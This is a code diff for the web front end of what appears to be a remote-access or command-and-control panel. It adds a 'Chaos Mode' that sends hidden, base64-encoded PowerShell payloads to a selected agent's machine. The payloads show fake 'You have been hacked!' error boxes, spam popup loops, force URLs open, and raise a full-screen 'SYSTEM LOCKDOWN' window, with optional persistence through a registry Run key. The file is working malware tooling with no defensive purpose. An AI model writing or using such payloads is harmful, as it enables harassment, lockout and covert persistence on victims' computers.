@@ -333,3 +333,175 @@ async function startFilelessExec() {
         showNotification('Error', `Failed: ${error.message}`);
     }
 }
+
+// ==========================================
+// Chaos Mode Logic
+// ==========================================
+
+function configureChaos() {
+    console.log('[Arsenal] Configure Chaos Mode clicked');
+    const agentId = window.selectedAgentId || selectedAgentId;
+
+    if (!agentId) {
+        showNotification('Error', 'Please select an agent first!');
+        return;
+    }
+
+    window.chaosTargetId = agentId;
+    document.getElementById('chaosModal').style.display = 'flex';
+}
+
+function closeChaosModal() {
+    document.getElementById('chaosModal').style.display = 'none';
+}
+
+async function triggerChaos() {
+    const agentId = window.chaosTargetId;
+    const isPersist = document.getElementById('chaosPersist').checked;
+
+    // Feature Checks
+    const doAlert = document.getElementById('chaosAlert').checked;
+    const doSpam = document.getElementById('chaosSpam').checked;
+    const doUrl = document.getElementById('chaosUrl').checked;
+    const doBlock = document.getElementById('chaosBlock').checked;
+
+    // Inputs
+    const alertMsg = document.getElementById('chaosAlertMsg').value || "You have been hacked!";
+    const spamCount = document.getElementById('chaosSpamCount').value || 50;
+    const urlLink = document.getElementById('chaosUrlLink').value || "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
+
+    let payloadParts = [];
+
+    // --- 1. Payload Construction ---
+
+    // Alert
+    if (doAlert) {
+        // Simple MessageBox
+        payloadParts.push(`Add-Type -AssemblyName PresentationCore; [System.Windows.MessageBox]::Show('${alertMsg}','System Error',[System.Windows.MessageBoxButton]::OK,[System.Windows.MessageBoxImage]::Error)`);
+    }
+
+    // URL
+    if (doUrl) {
+        payloadParts.push(`Start-Process '${urlLink}'`);
+    }
+
+    // Spam (Infinite Loop / Count)
+    if (doSpam) {
+        // Let's spawn a separate process for the spam so we can kill it later by looking for the CommandLine tag #RAMP_SPAM
+        // We escape the command carefully.
+        const spamCmd = `for($i=0; $i -lt ${spamCount}; $i++){ [System.Windows.MessageBox]::Show('${alertMsg}','warning',[System.Windows.MessageBoxButton]::OK,[System.Windows.MessageBoxImage]::Warning); Start-Sleep -Milliseconds 200 }`;
+        payloadParts.push(`Start-Process powershell.exe -ArgumentList '-WindowStyle','Hidden','-Command',"${spamCmd} ; #RAMP_SPAM"`);
+    }
+
+    // Block Screen
+    if (doBlock) {
+        // Overlay Form with specific title RAMP_BLOCK_SCREEN
+        const blockScript = `
+        Add-Type -AssemblyName System.Windows.Forms
+        $form = New-Object System.Windows.Forms.Form
+        $form.Text = 'RAMP_BLOCK_SCREEN'
+        $form.TopMost = $true
+        $form.WindowState = 'Maximized'
+        $form.FormBorderStyle = 'None'
+        $form.BackColor = 'Black'
+        $lbl = New-Object System.Windows.Forms.Label
+        $lbl.Text = 'SYSTEM LOCKDOWN - CONTACT ADMINISTRATOR'
+        $lbl.ForeColor = 'Red'
+        $lbl.Font = New-Object System.Drawing.Font('Consolas', 24)
+        $lbl.AutoSize = $true
+        $lbl.Location = New-Object System.Drawing.Point(100, 100)
+        $form.Controls.Add($lbl)
+        $form.ShowDialog()
+        `;
+        // Run in separate process so main agent doesn't hang
+        // We encode the block script to avoid quoting hell (and make it easier to nest)
+        // Since we are inside JS, we use our JS helper to init the encoded string
+        // But we can't call utf8_to_b64_utf16le synchronously inside the string template build so easily if it wasn't available.
+        // Thankfully we are in JS.
+
+        // However, we are building a string to be executed by the agent later.
+        // We can pre-encode the block script HERE in JS.
+        const encodedBlock = utf8_to_b64_utf16le(blockScript);
+        payloadParts.push(`Start-Process powershell.exe -ArgumentList '-WindowStyle','Hidden','-EncodedCommand','${encodedBlock}'`);
+    }
+
+    if (payloadParts.length === 0) {
+        showNotification('Warning', 'No chaos features selected!');
+        return;
+    }
+
+    let finalScript = payloadParts.join(' ; ');
+
+    // --- 2. Persistence Logic ---
+    if (isPersist) {
+        console.log('[Arsenal] Adding Persistence to Payload...');
+        // We want to persist the *Action*, not just run it once.
+        // So we take the finalScript, encode it, and set it as the value of the Registry Run key.
+        const encodedFinal = utf8_to_b64_utf16le(finalScript);
+        const persistCmd = `
+        $path = "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
+        $name = "RAMP_CHAOS"
+        $val = "powershell.exe -WindowStyle Hidden -EncodedCommand ${encodedFinal}"
+        New-ItemProperty -Path $path -Name $name -Value $val -Force
+        `;
+        // We append the persistence set-up to the script being run NOW. 
+        // So it runs the chaos NOW, AND sets it up for later.
+        finalScript = finalScript + " ; " + persistCmd;
+    }
+
+    closeChaosModal();
+
+    // --- 3. Execution ---
+    try {
+        // Always use PowerShell for Chaos Mode (Windows specific features)
+        const encodedPayload = utf8_to_b64_utf16le(finalScript);
+        const cmd = `run-memory powershell ${encodedPayload}`;
+
+        await sendCommandToAgent(agentId, cmd);
+        showNotification('Success', '🔥 Chaos Unleashed!');
+    } catch (error) {
+        console.error('[Arsenal] Chaos config failed:', error);
+        showNotification('Error', 'Failed to execute chaos');
+    }
+}
+
+async function stopChaosSpam() {
+    const agentId = window.chaosTargetId;
+    if (!agentId) return;
+
+    // Kill processes with #RAMP_SPAM in command line
+    const script = `Get-WmiObject Win32_Process | Where-Object { $_.CommandLine -like '*#RAMP_SPAM*' } | ForEach-Object { Stop-Process -Id $_.ProcessId -Force }`;
+
+    try {
+        const encoded = utf8_to_b64_utf16le(script);
+        await sendCommandToAgent(agentId, `run-memory powershell ${encoded}`);
+        showNotification('Success', 'Stopping Spam processes...');
+    } catch (e) { showNotification('Error', e.message); }
+}
+
+async function stopChaosBlock() {
+    const agentId = window.chaosTargetId;
+    if (!agentId) return;
+
+    // Kill process with WindowTitle 'RAMP_BLOCK_SCREEN'
+    const script = `Get-Process | Where-Object { $_.MainWindowTitle -eq 'RAMP_BLOCK_SCREEN' } | Stop-Process -Force`;
+
+    try {
+        const encoded = utf8_to_b64_utf16le(script);
+        await sendCommandToAgent(agentId, `run-memory powershell ${encoded}`);
+        showNotification('Success', 'Unlocking Screen...');
+    } catch (e) { showNotification('Error', e.message); }
+}
+
+async function removePersistence() {
+    const agentId = window.chaosTargetId;
+    if (!agentId) return;
+
+    const script = `Remove-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" -Name "RAMP_CHAOS" -ErrorAction SilentlyContinue`;
+
+    try {
+        const encoded = utf8_to_b64_utf16le(script);
+        await sendCommandToAgent(agentId, `run-memory powershell ${encoded}`);
+        showNotification('Success', 'Registry cleaned.');
+    } catch (e) { showNotification('Error', e.message); }
+}
